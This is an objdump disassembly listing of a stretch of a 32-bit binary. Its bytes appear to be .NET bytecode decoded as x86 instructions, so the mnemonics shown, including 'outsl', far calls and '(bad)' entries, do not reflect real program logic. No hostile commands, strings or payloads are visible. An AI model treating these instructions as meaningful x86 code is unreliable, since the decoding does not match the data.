  404533:	11 06                	adc    %eax,(%esi)
  404535:	6f                   	outsl  %ds:(%esi),(%dx)
  404536:	f9                   	stc
  404537:	00 00                	add    %al,(%eax)
  404539:	0a 73 fa             	or     -0x6(%ebx),%dh
  40453c:	00 00                	add    %al,(%eax)
  40453e:	0a 13                	or     (%ebx),%dl
  404540:	08 11                	or     %dl,(%ecx)
  404542:	08 11                	or     %dl,(%ecx)
  404544:	19 2d 0f 11 1b fe    	sbb    %ebp,0xfe1b110f
  40454a:	06                   	push   %es
  40454b:	77 00                	ja     0x40454d
  40454d:	00 06                	add    %al,(%esi)
  40454f:	73 f3                	jae    0x404544
  404551:	00 00                	add    %al,(%eax)
  404553:	0a 13                	or     (%ebx),%dl
  404555:	19 11                	sbb    %edx,(%ecx)
  404557:	19 6f fb             	sbb    %ebp,-0x5(%edi)
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 16                	or     (%esi),%dl
  40455e:	13 09                	adc    (%ecx),%ecx
  404560:	16                   	push   %ss
  404561:	13 0a                	adc    (%edx),%ecx
  404563:	16                   	push   %ss
  404564:	13 0b                	adc    (%ebx),%ecx
  404566:	72 01                	jb     0x404569
  404568:	00 00                	add    %al,(%eax)
  40456a:	70 13                	jo     0x40457f
  40456c:	0c 02                	or     $0x2,%al
  40456e:	13 1d 16 13 1e 38    	adc    0x381e1316,%ebx
  404574:	12 01                	adc    (%ecx),%al
  404576:	00 00                	add    %al,(%eax)
  404578:	11 1d 11 1e 9a 13    	adc    %ebx,0x139a1e11
  40457e:	0d 11 0d 72 7b       	or     $0x7b720d11,%eax
  404583:	02 00                	add    (%eax),%al
  404585:	70 17                	jo     0x40459e
  404587:	28 fc                	sub    %bh,%ah
  404589:	00 00                	add    %al,(%eax)
  40458b:	0a 2d 07 17 0b 38    	or     0x380b1707,%ch
  404591:	e9 00 00 00 11       	jmp    0x11404596
  404596:	0d 72 87 02 00       	or     $0x28772,%eax
  40459b:	70 19                	jo     0x4045b6
  40459d:	6f                   	outsl  %ds:(%esi),(%dx)
  40459e:	fd                   	std
  40459f:	00 00                	add    %al,(%eax)
  4045a1:	0a 2c 61             	or     (%ecx,%eiz,2),%ch
  4045a4:	11 0d 17 8d 33 00    	adc    %ecx,0x338d17
  4045aa:	00 01                	add    %al,(%ecx)
  4045ac:	13 1f                	adc    (%edi),%ebx
  4045ae:	11 1f                	adc    %ebx,(%edi)
  4045b0:	16                   	push   %ss
  4045b1:	72 99                	jb     0x40454c
  4045b3:	02 00                	add    (%eax),%al
  4045b5:	70 a2                	jo     0x404559
  4045b7:	11 1f                	adc    %ebx,(%edi)
  4045b9:	18 17                	sbb    %dl,(%edi)
  4045bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4045bc:	fe 00                	incb   (%eax)
  4045be:	00 0a                	add    %cl,(%edx)
  4045c0:	13 0e                	adc    (%esi),%ecx
  4045c2:	11 0e                	adc    %ecx,(%esi)
  4045c4:	8e 69 18             	mov    0x18(%ecx),%gs
  4045c7:	2e 20 72 9d          	and    %dh,%cs:-0x63(%edx)
  4045cb:	02 00                	add    (%eax),%al
  4045cd:	70 28                	jo     0x4045f7
  4045cf:	28 00                	sub    %al,(%eax)
  4045d1:	00 0a                	add    %cl,(%edx)
  4045d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d4:	29 00                	sub    %eax,(%eax)
  4045d6:	00 0a                	add    %cl,(%edx)
  4045d8:	16                   	push   %ss
  4045d9:	1f                   	pop    %ds
  4045da:	10 28                	adc    %ch,(%eax)
  4045dc:	ff 00                	incl   (%eax)
  4045de:	00 0a                	add    %cl,(%edx)
  4045e0:	26 17                	es pop %ss
  4045e2:	13 1c dd 3d 04 00 00 	adc    0x43d(,%ebx,8),%ebx
  4045e9:	11 0e                	adc    %ecx,(%esi)
  4045eb:	17                   	pop    %ss
  4045ec:	9a 17 8d 62 00 00 01 	lcall  $0x100,$0x628d17
  4045f3:	13 20                	adc    (%eax),%esp
  4045f5:	11 20                	adc    %esp,(%eax)
  4045f7:	16                   	push   %ss
  4045f8:	1f                   	pop    %ds
  4045f9:	22 9d 11 20 6f 00    	and    0x6f2011(%ebp),%bl
  4045ff:	01 00                	add    %eax,(%eax)
  404601:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  404604:	79 11                	jns    0x404617
  404606:	0d 72 7c 03 00       	or     $0x37c72,%eax
  40460b:	70 17                	jo     0x404624
  40460d:	28 fc                	sub    %bh,%ah
  40460f:	00 00                	add    %al,(%eax)
  404611:	0a 2d 08 11 0a 17    	or     0x170a1108,%ch
  404617:	58                   	pop    %eax
  404618:	13 09                	adc    (%ecx),%ecx
  40461a:	2b 79 11             	sub    0x11(%ecx),%edi
  40461d:	0d 72 86 03 00       	or     $0x38672,%eax
  404622:	70 17                	jo     0x40463b
  404624:	28 fc                	sub    %bh,%ah
  404626:	00 00                	add    %al,(%eax)
  404628:	0a 2d 05 17 13 0b    	or     0xb131705,%ch
  40462e:	2b 4e 11             	sub    0x11(%esi),%ecx
  404631:	0b 2c 33             	or     (%ebx,%esi,1),%ebp
  404634:	11 0d 72 8c 03 00    	adc    %ecx,0x38c72
  40463a:	70 17                	jo     0x404653
  40463c:	28 fc                	sub    %bh,%ah
  40463e:	00 00                	add    %al,(%eax)
  404640:	0a 2c 1e             	or     (%esi,%ebx,1),%ch
  404643:	11 0d 72 a0 03 00    	adc    %ecx,0x3a072
  404649:	70 17                	jo     0x404662
  40464b:	28 fc                	sub    %bh,%ah
  40464d:	00 00                	add    %al,(%eax)
  40464f:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  404652:	11 0d 72 b4 03 00    	adc    %ecx,0x3b472
  404658:	70 17                	jo     0x404671
  40465a:	28 fc                	sub    %bh,%ah
  40465c:	00 00                	add    %al,(%eax)
  40465e:	0a 2d 1d 11 0d 13    	or     0x130d111d,%ch
  404664:	0c 2b                	or     $0x2b,%al
  404666:	17                   	pop    %ss
  404667:	11 0d 72 c0 03 00    	adc    %ecx,0x3c072
  40466d:	70 17                	jo     0x404686
  40466f:	28 fc                	sub    %bh,%ah
  404671:	00 00                	add    %al,(%eax)
  404673:	0a 2d 08 28 01 01    	or     0x1012808,%ch
  404679:	00 0a                	add    %cl,(%edx)
  40467b:	26 2b 17             	sub    %es:(%edi),%edx
  40467e:	11 0a                	adc    %ecx,(%edx)
  404680:	17                   	pop    %ss
  404681:	58                   	pop    %eax
  404682:	13 0a                	adc    (%edx),%ecx
  404684:	11 1e                	adc    %ebx,(%esi)
  404686:	17                   	pop    %ss
  404687:	58                   	pop    %eax
  404688:	13 1e                	adc    (%esi),%ebx
  40468a:	11 1e                	adc    %ebx,(%esi)
  40468c:	11 1d 8e 69 3f e3    	adc    %ebx,0xe33f698e
  404692:	fe                   	(bad)
  404693:	ff                   	(bad)
  404694:	ff 28                	ljmp   *(%eax)
  404696:	47                   	inc    %edi
  404697:	00 00                	add    %al,(%eax)
  404699:	0a 13                	or     (%ebx),%dl
  40469b:	0f 11 0f             	movups %xmm1,(%edi)
  40469e:	72 ce                	jb     0x40466e
  4046a0:	03 00                	add    (%eax),%eax
  4046a2:	70 6f                	jo     0x404713
  4046a4:	02 01                	add    (%ecx),%al
  4046a6:	00 0a                	add    %cl,(%edx)
  4046a8:	13 10                	adc    (%eax),%edx
  4046aa:	11 10                	adc    %edx,(%eax)
  4046ac:	28 03                	sub    %al,(%ebx)
  4046ae:	01 00                	add    %eax,(%eax)
  4046b0:	0a 73 04             	or     0x4(%ebx),%dh
  4046b3:	01 00                	add    %eax,(%eax)
  4046b5:	0a 13                	or     (%ebx),%dl
  4046b7:	11 11                	adc    %edx,(%ecx)
  4046b9:	11 6f 05             	adc    %ebp,0x5(%edi)
  4046bc:	01 00                	add    %eax,(%eax)
  4046be:	0a 13                	or     (%ebx),%dl
  4046c0:	12 08                	adc    (%eax),%cl
  4046c2:	28 0d 00 00 0a 2d    	sub    %cl,0x2d0a0000
  4046c8:	10 08                	adc    %cl,(%eax)
  4046ca:	11 12                	adc    %edx,(%edx)
  4046cc:	28 06                	sub    %al,(%esi)
  4046ce:	01 00                	add    %eax,(%eax)
  4046d0:	0a 16                	or     (%esi),%dl
  4046d2:	13 1c dd 4d 03 00 00 	adc    0x34d(,%ebx,8),%ebx
  4046d9:	11 0b                	adc    %ecx,(%ebx)
  4046db:	2c 6f                	sub    $0x6f,%al
  4046dd:	11 05 1f 09 8d 33    	adc    %eax,0x338d091f
  4046e3:	00 00                	add    %al,(%eax)
  4046e5:	01 13                	add    %edx,(%ebx)
  4046e7:	21 11                	and    %edx,(%ecx)
  4046e9:	21 16                	and    %edx,(%esi)
  4046eb:	72 e2                	jb     0x4046cf
  4046ed:	03 00                	add    (%eax),%eax
  4046ef:	70 a2                	jo     0x404693
  4046f1:	11 21                	adc    %esp,(%ecx)
  4046f3:	17                   	pop    %ss
  4046f4:	28 28                	sub    %ch,(%eax)
  4046f6:	00 00                	add    %al,(%eax)
  4046f8:	0a 6f 29             	or     0x29(%edi),%ch
  4046fb:	00 00                	add    %al,(%eax)
  4046fd:	0a a2 11 21 18 72    	or     0x72182111(%edx),%ah
  404703:	f6 03 00             	testb  $0x0,(%ebx)
  404706:	70 a2                	jo     0x4046aa
  404708:	11 21                	adc    %esp,(%ecx)
  40470a:	19 11                	sbb    %edx,(%ecx)
  40470c:	12 a2 11 21 1a 72    	adc    0x721a2111(%edx),%ah
  404712:	fa                   	cli
  404713:	03 00                	add    (%eax),%eax
  404715:	70 a2                	jo     0x4046b9
  404717:	11 21                	adc    %esp,(%ecx)
  404719:	1b 28                	sbb    (%eax),%ebp
  40471b:	28 00                	sub    %al,(%eax)
  40471d:	00 0a                	add    %cl,(%edx)
  40471f:	6f                   	outsl  %ds:(%esi),(%dx)
  404720:	29 00                	sub    %eax,(%eax)
  404722:	00 0a                	add    %cl,(%edx)
  404724:	a2 11 21 1c 72       	mov    %al,0x721c2111
  404729:	14 04                	adc    $0x4,%al
  40472b:	00 70 a2             	add    %dh,-0x5e(%eax)
  40472e:	11 21                	adc    %esp,(%ecx)
  404730:	1d 11 0c a2 11       	sbb    $0x11a20c11,%eax
  404735:	21 1e                	and    %ebx,(%esi)
  404737:	72 18                	jb     0x404751
  404739:	04 00                	add    $0x0,%al
  40473b:	70 a2                	jo     0x4046df
  40473d:	11 21                	adc    %esp,(%ecx)
  40473f:	28 07                	sub    %al,(%edi)
  404741:	01 00                	add    %eax,(%eax)
  404743:	0a 6f 08             	or     0x8(%edi),%ch
  404746:	01 00                	add    %eax,(%eax)
  404748:	0a 26                	or     (%esi),%ah
  40474a:	2b 0a                	sub    (%edx),%ecx
  40474c:	11 05 11 12 6f 08    	adc    %eax,0x86f1211
  404752:	01 00                	add    %eax,(%eax)
  404754:	0a 26                	or     (%esi),%ah
  404756:	de 0c 11             	fimuls (%ecx,%edx,1)
  404759:	11 2c 07             	adc    %ebp,(%edi,%eax,1)
  40475c:	11 11                	adc    %edx,(%ecx)
  40475e:	6f                   	outsl  %ds:(%esi),(%dx)
  40475f:	5f                   	pop    %edi
  404760:	00 00                	add    %al,(%eax)
  404762:	0a dc                	or     %ah,%bl
  404764:	de 0c 11             	fimuls (%ecx,%edx,1)
  404767:	10 2c 07             	adc    %ch,(%edi,%eax,1)
  40476a:	11 10                	adc    %edx,(%eax)
  40476c:	6f                   	outsl  %ds:(%esi),(%dx)
  40476d:	5f                   	pop    %edi
  40476e:	00 00                	add    %al,(%eax)
  404770:	0a dc                	or     %ah,%bl
  404772:	11 0b                	adc    %ecx,(%ebx)
  404774:	3a f8                	cmp    %al,%bh
  404776:	01 00                	add    %eax,(%eax)
  404778:	00 14 13             	add    %dl,(%ebx,%edx,1)
  40477b:	13 72 34             	adc    0x34(%edx),%esi
  40477e:	04 00                	add    $0x0,%al
  404780:	70 73                	jo     0x4047f5
  404782:	09 01                	or     %eax,(%ecx)
  404784:	00 0a                	add    %cl,(%edx)
  404786:	13 14 11             	adc    (%ecx,%edx,1),%edx
  404789:	09 13                	or     %edx,(%ebx)
  40478b:	15 38 ae 01 00       	adc    $0x1ae38,%eax
  404790:	00 11                	add    %dl,(%ecx)
  404792:	14 02                	adc    $0x2,%al
  404794:	11 15 9a 6f 0a 01    	adc    %edx,0x10a6f9a
  40479a:	00 0a                	add    %cl,(%edx)
  40479c:	13 16                	adc    (%esi),%edx
  40479e:	11 16                	adc    %edx,(%esi)
  4047a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4047a1:	0b 01                	or     (%ecx),%eax
  4047a3:	00 0a                	add    %cl,(%edx)
  4047a5:	39 6c 01 00          	cmp    %ebp,0x0(%ecx,%eax,1)
  4047a9:	00 11                	add    %dl,(%ecx)
  4047ab:	16                   	push   %ss
  4047ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4047ad:	0c 01                	or     $0x1,%al
  4047af:	00 0a                	add    %cl,(%edx)
  4047b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4047b2:	0d 01 00 0a 19       	or     $0x190a0001,%eax
  4047b7:	40                   	inc    %eax
  4047b8:	5a                   	pop    %edx
  4047b9:	01 00                	add    %eax,(%eax)
  4047bb:	00 02                	add    %al,(%edx)
  4047bd:	11 15 9a 12 17 28    	adc    %edx,0x2817129a
  4047c3:	0e                   	push   %cs
  4047c4:	01 00                	add    %eax,(%eax)
  4047c6:	0a 3a                	or     (%edx),%bh
  4047c8:	4a                   	dec    %edx
  4047c9:	01 00                	add    %eax,(%eax)
  4047cb:	00 11                	add    %dl,(%ecx)
  4047cd:	13 2c 0a             	adc    (%edx,%ecx,1),%ebp
  4047d0:	11 05 11 13 6f 0f    	adc    %eax,0xf6f1311
  4047d6:	01 00                	add    %eax,(%eax)
  4047d8:	0a 26                	or     (%esi),%ah
  4047da:	11 16                	adc    %edx,(%esi)
  4047dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4047dd:	0c 01                	or     $0x1,%al
  4047df:	00 0a                	add    %cl,(%edx)
  4047e1:	18 6f 10             	sbb    %ch,0x10(%edi)
  4047e4:	01 00                	add    %eax,(%eax)
  4047e6:	0a 6f 11             	or     0x11(%edi),%ch
  4047e9:	01 00                	add    %eax,(%eax)
  4047eb:	0a 6f 12             	or     0x12(%edi),%ch
  4047ee:	01 00                	add    %eax,(%eax)
  4047f0:	0a 72 01             	or     0x1(%edx),%dh
  4047f3:	00 00                	add    %al,(%eax)
  4047f5:	70 28                	jo     0x40481f
  4047f7:	c4 00                	les    (%eax),%eax
  4047f9:	00 0a                	add    %cl,(%edx)
  4047fb:	2c 19                	sub    $0x19,%al
  4047fd:	11 16                	adc    %edx,(%esi)
  4047ff:	6f                   	outsl  %ds:(%esi),(%dx)
  404800:	0c 01                	or     $0x1,%al
  404802:	00 0a                	add    %cl,(%edx)
  404804:	17                   	pop    %ss
  404805:	6f                   	outsl  %ds:(%esi),(%dx)
  404806:	10 01                	adc    %al,(%ecx)
  404808:	00 0a                	add    %cl,(%edx)
  40480a:	6f                   	outsl  %ds:(%esi),(%dx)
  40480b:	11 01                	adc    %eax,(%ecx)
  40480d:	00 0a                	add    %cl,(%edx)
  40480f:	13 13                	adc    (%ebx),%edx
  404811:	38 23                	cmp    %ah,(%ebx)
  404813:	01 00                	add    %eax,(%eax)
  404815:	00 11                	add    %dl,(%ecx)
  404817:	16                   	push   %ss
  404818:	6f                   	outsl  %ds:(%esi),(%dx)
  404819:	0c 01                	or     $0x1,%al
  40481b:	00 0a                	add    %cl,(%edx)
  40481d:	18 6f 10             	sbb    %ch,0x10(%edi)
  404820:	01 00                	add    %eax,(%eax)
  404822:	0a 6f 11             	or     0x11(%edi),%ch
  404825:	01 00                	add    %eax,(%eax)
  404827:	0a 72 64             	or     0x64(%edx),%dh
  40482a:	04 00                	add    $0x0,%al
  40482c:	70 28                	jo     0x404856
  40482e:	c4 00                	les    (%eax),%eax
  404830:	00 0a                	add    %cl,(%edx)
  404832:	2d 23 11 16 6f       	sub    $0x6f161123,%eax
  404837:	0c 01                	or     $0x1,%al
  404839:	00 0a                	add    %cl,(%edx)
  40483b:	18 6f 10             	sbb    %ch,0x10(%edi)
  40483e:	01 00                	add    %eax,(%eax)
  404840:	0a 6f 11             	or     0x11(%edi),%ch
  404843:	01 00                	add    %eax,(%eax)
  404845:	0a 6f 13             	or     0x13(%edi),%ch
  404848:	01 00                	add    %eax,(%eax)
  40484a:	0a 72 6e             	or     0x6e(%edx),%dh
  40484d:	04 00                	add    $0x0,%al
  40484f:	70 28                	jo     0x404879
  404851:	c4 00                	les    (%eax),%eax
  404853:	00 0a                	add    %cl,(%edx)
  404855:	2c 28                	sub    $0x28,%al
  404857:	11 05 11 16 6f 0c    	adc    %eax,0xc6f1611
  40485d:	01 00                	add    %eax,(%eax)
  40485f:	0a 17                	or     (%edi),%dl
  404861:	6f                   	outsl  %ds:(%esi),(%dx)
  404862:	10 01                	adc    %al,(%ecx)
  404864:	00 0a                	add    %cl,(%edx)
  404866:	6f                   	outsl  %ds:(%esi),(%dx)
  404867:	11 01                	adc    %eax,(%ecx)
  404869:	00 0a                	add    %cl,(%edx)
  40486b:	17                   	pop    %ss
  40486c:	8c 8d 00 00 01 6f    	mov    %cs,0x6f010000(%ebp)
  404872:	14 01                	adc    $0x1,%al
  404874:	00 0a                	add    %cl,(%edx)
  404876:	26 14 13             	es adc $0x13,%al
  404879:	13 38                	adc    (%eax),%edi
  40487b:	ba 00 00 00 11       	mov    $0x11000000,%edx
  404880:	16                   	push   %ss
  404881:	6f                   	outsl  %ds:(%esi),(%dx)
  404882:	0c 01                	or     $0x1,%al
  404884:	00 0a                	add    %cl,(%edx)
  404886:	18 6f 10             	sbb    %ch,0x10(%edi)
  404889:	01 00                	add    %eax,(%eax)
  40488b:	0a 6f 11             	or     0x11(%edi),%ch
  40488e:	01 00                	add    %eax,(%eax)
  404890:	0a 72 7a             	or     0x7a(%edx),%dh
  404893:	04 00                	add    $0x0,%al
  404895:	70 28                	jo     0x4048bf
  404897:	c4 00                	les    (%eax),%eax
  404899:	00 0a                	add    %cl,(%edx)
  40489b:	2d 23 11 16 6f       	sub    $0x6f161123,%eax
  4048a0:	0c 01                	or     $0x1,%al
  4048a2:	00 0a                	add    %cl,(%edx)
  4048a4:	18 6f 10             	sbb    %ch,0x10(%edi)
  4048a7:	01 00                	add    %eax,(%eax)
  4048a9:	0a 6f 11             	or     0x11(%edi),%ch
  4048ac:	01 00                	add    %eax,(%eax)
  4048ae:	0a 6f 13             	or     0x13(%edi),%ch
  4048b1:	01 00                	add    %eax,(%eax)
  4048b3:	0a 72 86             	or     -0x7a(%edx),%dh
  4048b6:	04 00                	add    $0x0,%al
  4048b8:	70 28                	jo     0x4048e2
  4048ba:	c4 00                	les    (%eax),%eax
  4048bc:	00 0a                	add    %cl,(%edx)
  4048be:	2c 25                	sub    $0x25,%al
  4048c0:	11 05 11 16 6f 0c    	adc    %eax,0xc6f1611
  4048c6:	01 00                	add    %eax,(%eax)
  4048c8:	0a 17                	or     (%edi),%dl
  4048ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4048cb:	10 01                	adc    %al,(%ecx)
  4048cd:	00 0a                	add    %cl,(%edx)
  4048cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4048d0:	11 01                	adc    %eax,(%ecx)
  4048d2:	00 0a                	add    %cl,(%edx)
  4048d4:	16                   	push   %ss
  4048d5:	8c 8d 00 00 01 6f    	mov    %cs,0x6f010000(%ebp)
  4048db:	14 01                	adc    $0x1,%al
  4048dd:	00 0a                	add    %cl,(%edx)
  4048df:	26 14 13             	es adc $0x13,%al
  4048e2:	13 2b                	adc    (%ebx),%ebp
  4048e4:	54                   	push   %esp
  4048e5:	11 05 11 16 6f 0c    	adc    %eax,0xc6f1611
  4048eb:	01 00                	add    %eax,(%eax)
  4048ed:	0a 17                	or     (%edi),%dl
  4048ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4048f0:	10 01                	adc    %al,(%ecx)
  4048f2:	00 0a                	add    %cl,(%edx)
  4048f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4048f5:	11 01                	adc    %eax,(%ecx)
  4048f7:	00 0a                	add    %cl,(%edx)
  4048f9:	11 16                	adc    %edx,(%esi)
  4048fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4048fc:	0c 01                	or     $0x1,%al
  4048fe:	00 0a                	add    %cl,(%edx)
  404900:	18 6f 10             	sbb    %ch,0x10(%edi)
  404903:	01 00                	add    %eax,(%eax)
  404905:	0a 6f 11             	or     0x11(%edi),%ch
  404908:	01 00                	add    %eax,(%eax)
  40490a:	0a 6f 14             	or     0x14(%edi),%ch
  40490d:	01 00                	add    %eax,(%eax)
  40490f:	0a 26                	or     (%esi),%ah
  404911:	14 13                	adc    $0x13,%al
  404913:	13 2b                	adc    (%ebx),%ebp
  404915:	23 11                	and    (%ecx),%edx
  404917:	13 2c 13             	adc    (%ebx,%edx,1),%ebp
  40491a:	11 05 11 13 02 11    	adc    %eax,0x11021311
  404920:	15 9a 6f 14 01       	adc    $0x1146f9a,%eax
  404925:	00 0a                	add    %cl,(%edx)
  404927:	26 14 13             	es adc $0x13,%al
  40492a:	13 2b                	adc    (%ebx),%ebp
  40492c:	0c 11                	or     $0x11,%al
  40492e:	05 02 11 15 9a       	add    $0x9a151102,%eax
  404933:	6f                   	outsl  %ds:(%esi),(%dx)
  404934:	15 01 00 0a 26       	adc    $0x260a0001,%eax
  404939:	11 15 17 58 13 15    	adc    %edx,0x15135817
  40493f:	11 15 02 8e 69 3f    	adc    %edx,0x3f698e02
  404945:	48                   	dec    %eax
  404946:	fe                   	(bad)
  404947:	ff                   	(bad)
  404948:	ff 11                	call   *(%ecx)
  40494a:	13 2c 0a             	adc    (%edx,%ecx,1),%ebp
  40494d:	11 05 11 13 6f 0f    	adc    %eax,0xf6f1311
  404953:	01 00                	add    %eax,(%eax)
  404955:	0a 26                	or     (%esi),%ah
  404957:	11 05 72 94 04 00    	adc    %eax,0x49472
  40495d:	70 6f                	jo     0x4049ce
  40495f:	16                   	push   %ss
  404960:	01 00                	add    %eax,(%eax)
  404962:	0a 26                	or     (%esi),%ah
  404964:	11 05 72 aa 04 00    	adc    %eax,0x4aa72
  40496a:	70 6f                	jo     0x4049db
  40496c:	0f 01 00             	sgdtl  (%eax)
  40496f:	0a 26                	or     (%esi),%ah
  404971:	11 05 11 06 11 08    	adc    %eax,0x8110611
  404977:	14 11                	adc    $0x11,%al
  404979:	1a 2d 0f 11 1b fe    	sbb    0xfe1b110f,%ch
  40497f:	06                   	push   %es
  404980:	78 00                	js     0x404982
  404982:	00 06                	add    %al,(%esi)
  404984:	73 17                	jae    0x40499d
  404986:	01 00                	add    %eax,(%eax)
  404988:	0a 13                	or     (%ebx),%dl
  40498a:	1a 11                	sbb    (%ecx),%dl
  40498c:	1a 14 6f             	sbb    (%edi,%ebp,2),%dl
  40498f:	02 00                	add    (%eax),%al
  404991:	00 2b                	add    %ch,(%ebx)
  404993:	26 06                	es push %es
  404995:	6f                   	outsl  %ds:(%esi),(%dx)
  404996:	6e                   	outsb  %ds:(%esi),(%dx)
  404997:	00 00                	add    %al,(%eax)
  404999:	06                   	push   %es
  40499a:	2d 10 11 1b 7b       	sub    $0x7b1b1110,%eax
  40499f:	50                   	push   %eax
  4049a0:	00 00                	add    %al,(%eax)
  4049a2:	04 1f                	add    $0x1f,%al
  4049a4:	64 6f                	outsl  %fs:(%esi),(%dx)
  4049a6:	19 01                	sbb    %eax,(%ecx)
  4049a8:	00 0a                	add    %cl,(%edx)
  4049aa:	2c e8                	sub    $0xe8,%al
  4049ac:	11 05 6f 1a 01 00    	adc    %eax,0x11a6f
  4049b2:	0a 11                	or     (%ecx),%dl
  4049b4:	05 6f 1b 01 00       	add    $0x11b6f,%eax
  4049b9:	0a 6f 1c             	or     0x1c(%edi),%ch
  4049bc:	01 00                	add    %eax,(%eax)
  4049be:	0a 1b                	or     (%ebx),%bl
  4049c0:	33 1d 11 1b 7b 4f    	xor    0x4f7b1b11,%ebx
  4049c6:	00 00                	add    %al,(%eax)
  4049c8:	04 11                	add    $0x11,%al
  4049ca:	05 6f 1b 01 00       	add    $0x11b6f,%eax
  4049cf:	0a 6f 1d             	or     0x1d(%edi),%ch
  4049d2:	01 00                	add    %eax,(%eax)
  4049d4:	0a 6f e3             	or     -0x1d(%edi),%ch
  4049d7:	00 00                	add    %al,(%eax)
  4049d9:	0a 6f e4             	or     -0x1c(%edi),%ch
  4049dc:	00 00                	add    %al,(%eax)
  4049de:	0a de                	or     %dh,%bl
  4049e0:	0c 11                	or     $0x11,%al
  4049e2:	05 2c 07 11 05       	add    $0x511072c,%eax
  4049e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4049e8:	5f                   	pop    %edi
  4049e9:	00 00                	add    %al,(%eax)
  4049eb:	0a dc                	or     %ah,%bl
  4049ed:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4049f0:	1e                   	push   %ds
  4049f1:	01 00                	add    %eax,(%eax)
  4049f3:	0a de                	or     %dh,%bl
  4049f5:	0c 11                	or     $0x11,%al
  4049f7:	04 2c                	add    $0x2c,%al
  4049f9:	07                   	pop    %es
  4049fa:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4049fd:	5f                   	pop    %edi
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	0a dc                	or     %ah,%bl
  404a02:	de 03                	fiadds (%ebx)
  404a04:	26 de 00             	fiadds %es:(%eax)
  404a07:	07                   	pop    %es
  404a08:	2c 15                	sub    $0x15,%al
  404a0a:	72 b8                	jb     0x4049c4
  404a0c:	04 00                	add    $0x0,%al
  404a0e:	70 28                	jo     0x404a38
  404a10:	28 00                	sub    %al,(%eax)
  404a12:	00 0a                	add    %cl,(%edx)
  404a14:	6f                   	outsl  %ds:(%esi),(%dx)
  404a15:	29 00                	sub    %eax,(%eax)
  404a17:	00 0a                	add    %cl,(%edx)
  404a19:	28 ab 00 00 0a 26    	sub    %ch,0x260a0000(%ebx)
  404a1f:	06                   	push   %es
  404a20:	6f                   	outsl  %ds:(%esi),(%dx)
  404a21:	70 00                	jo     0x404a23
  404a23:	00 06                	add    %al,(%esi)
  404a25:	2a 11                	sub    (%ecx),%dl
  404a27:	1c 2a                	sbb    $0x2a,%al
  404a29:	00 00                	add    %al,(%eax)
  404a2b:	00 41 7c             	add    %al,0x7c(%ecx)
  404a2e:	00 00                	add    %al,(%eax)
  404a30:	02 00                	add    (%eax),%al
  404a32:	00 00                	add    %al,(%eax)
  404a34:	5c                   	pop    %esp
  404a35:	02 00                	add    (%eax),%al
  404a37:	00 a0 00 00 00 fc    	add    %ah,-0x4000000(%eax)
  404a3d:	02 00                	add    (%eax),%al
  404a3f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a42:	00 00                	add    %al,(%eax)
  404a44:	00 00                	add    %al,(%eax)
  404a46:	00 00                	add    %al,(%eax)
  404a48:	02 00                	add    (%eax),%al
  404a4a:	00 00                	add    %al,(%eax)
  404a4c:	4e                   	dec    %esi
  404a4d:	02 00                	add    (%eax),%al
  404a4f:	00 bc 00 00 00 0a 03 	add    %bh,0x30a0000(%eax,%eax,1)
  404a56:	00 00                	add    %al,(%eax)
  404a58:	0c 00                	or     $0x0,%al
  404a5a:	00 00                	add    %al,(%eax)
  404a5c:	00 00                	add    %al,(%eax)
  404a5e:	00 00                	add    %al,(%eax)
  404a60:	02 00                	add    (%eax),%al
  404a62:	00 00                	add    %al,(%eax)
  404a64:	7e 00                	jle    0x404a66
  404a66:	00 00                	add    %al,(%eax)
  404a68:	07                   	pop    %es
  404a69:	05 00 00 85 05       	add    $0x5850000,%eax
  404a6e:	00 00                	add    %al,(%eax)
  404a70:	0c 00                	or     $0x0,%al
  404a72:	00 00                	add    %al,(%eax)
  404a74:	00 00                	add    %al,(%eax)
  404a76:	00 00                	add    %al,(%eax)
  404a78:	02 00                	add    (%eax),%al
  404a7a:	00 00                	add    %al,(%eax)
  404a7c:	68 00 00 00 32       	push   $0x32000000
  404a81:	05 00 00 9a 05       	add    $0x59a0000,%eax
  404a86:	00 00                	add    %al,(%eax)
  404a88:	0c 00                	or     $0x0,%al
	...
  404a92:	00 00                	add    %al,(%eax)
  404a94:	60                   	pusha
  404a95:	00 00                	add    %al,(%eax)
  404a97:	00 48 05             	add    %cl,0x5(%eax)
  404a9a:	00 00                	add    %al,(%eax)
  404a9c:	a8 05                	test   $0x5,%al
  404a9e:	00 00                	add    %al,(%eax)
  404aa0:	03 00                	add    (%eax),%eax
  404aa2:	00 00                	add    %al,(%eax)
  404aa4:	69 00 00 01 6a 72    	imul   $0x726a0100,(%eax),%eax
  404aaa:	e0 04                	loopne 0x404ab0
  404aac:	00 70 28             	add    %dh,0x28(%eax)
  404aaf:	28 00                	sub    %al,(%eax)
  404ab1:	00 0a                	add    %cl,(%edx)
  404ab3:	6f                   	outsl  %ds:(%esi),(%dx)
  404ab4:	29 00                	sub    %eax,(%eax)
  404ab6:	00 0a                	add    %cl,(%edx)
  404ab8:	28 a7 00 00 0a 73    	sub    %ah,0x730a0000(%edi)
  404abe:	1f                   	pop    %ds
  404abf:	01 00                	add    %eax,(%eax)
  404ac1:	0a 7a 1e             	or     0x1e(%edx),%bh
  404ac4:	02 28                	add    (%eax),%ch
  404ac6:	11 00                	adc    %eax,(%eax)
  404ac8:	00 0a                	add    %cl,(%edx)
  404aca:	2a 00                	sub    (%eax),%al
  404acc:	00 00                	add    %al,(%eax)
  404ace:	00 00                	add    %al,(%eax)
  404ad0:	37                   	aaa
  404ad1:	04 00                	add    $0x0,%al
  404ad3:	00 23                	add    %ah,(%ebx)
  404ad5:	20 45 78             	and    %al,0x78(%ebp)
